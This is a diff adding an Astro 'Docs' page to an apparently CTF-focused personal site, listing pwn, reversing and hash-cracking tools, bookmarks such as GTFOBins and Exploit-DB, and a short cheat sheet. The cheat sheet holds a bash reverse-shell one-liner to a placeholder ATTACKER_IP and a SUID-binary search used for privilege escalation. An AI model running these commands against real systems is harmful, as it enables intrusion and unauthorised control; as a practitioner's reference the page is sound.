@@ -1,0 +1,102 @@
+---
+import Layout from '../layouts/Layout.astro';
+---
+
+<Layout title="Docs | Zemi">
+    <main class="container">
+        <h1>Docs</h1>
+        <p>Stuff I got tired of looking up every single time. If it's here, I've probably needed it more than once.</p>
+
+        <section class="category">
+            <h2>What I use</h2>
+            <ul class="tool-list">
+                <li><a href="https://github.com/Gallopsled/pwntools" target="_blank"><strong>pwntools</strong></a>, can't do pwn without it at this point</li>
+                <li><a href="https://github.com/pwndbg/pwndbg" target="_blank"><strong>GDB + pwndbg</strong></a>, for when you need to see what the heap actually looks like</li>
+                <li><a href="https://ghidra-sre.org" target="_blank"><strong>Ghidra</strong></a>, free and honestly good enough for most reversing</li>
+                <li><a href="https://portswigger.net/burp" target="_blank"><strong>Burp Suite</strong></a>, intercept everything, figure it out later</li>
+                <li><a href="https://gchq.github.io/CyberChef" target="_blank"><strong>CyberChef</strong></a>, the "I have no idea what encoding this is" tool</li>
+                <li><a href="https://github.com/openwall/john" target="_blank"><strong>John</strong></a> / <a href="https://hashcat.net/hashcat" target="_blank"><strong>Hashcat</strong></a>, for cracking hashes when the password isn't "password123"</li>
+            </ul>
+        </section>
+
+        <section class="category">
+            <h2>Stuff I always forget</h2>
+            <div class="terminal-box">
+                <p><span class="prompt">#</span> Reverse shell (bash)</p>
+                <code>bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1</code>
+            </div>
+            <div class="terminal-box">
+                <p><span class="prompt">#</span> Find SUID binaries</p>
+                <code>find / -perm -4000 -type f 2>/dev/null</code>
+            </div>
+            <div class="terminal-box">
+                <p><span class="prompt">#</span> Check binary protections</p>
+                <code>checksec --file=./binary</code>
+            </div>
+        </section>
+
+        <section class="category">
+            <h2>Bookmarks</h2>
+            <ul class="tool-list">
+                <li><a href="https://gtfobins.github.io" target="_blank">GTFOBins</a>, first thing I check for privesc</li>
+                <li><a href="https://exploit-db.com" target="_blank">Exploit-DB</a>, searchable exploit archive, saved me more than once</li>
+                <li><a href="https://ctftime.org" target="_blank">CTFtime</a>, where I find upcoming competitions</li>
+                <li><a href="https://crackstation.net" target="_blank">CrackStation</a>, lazy hash cracking when you don't want to spin up hashcat</li>
+            </ul>
+        </section>
+    </main>
+</Layout>
+
+<style>
+    .container {
+        max-width: 800px;
+        margin: 0 auto;
+        padding: 2rem 1rem;
+    }
+
+    .category {
+        margin-bottom: 2.5rem;
+    }
+
+    .category h2 {
+        color: var(--accent);
+        border-bottom: 1px solid #30363d;
+        padding-bottom: 0.5rem;
+    }
+
+    .tool-list {
+        list-style-type: square;
+        padding-left: 1.5rem;
+    }
+
+    .tool-list li {
+        margin-bottom: 0.8rem;
+        font-size: 1.05em;
+    }
+
+    .terminal-box {
+        background-color: #161b22;
+        border: 1px solid #30363d;
+        border-left: 4px solid var(--accent);
+        padding: 1rem 1.5rem;
+        margin: 1rem 0;
+        font-family: "Courier New", monospace;
+        border-radius: 4px;
+    }
+
+    .terminal-box p {
+        margin: 0 0 0.5rem 0;
+        color: #8b949e;
+        font-size: 0.85em;
+    }
+
+    .terminal-box code {
+        color: #e6edf3;
+        font-size: 0.95em;
+    }
+
+    .prompt {
+        color: var(--accent);
+        font-weight: bold;
+    }
+</style>
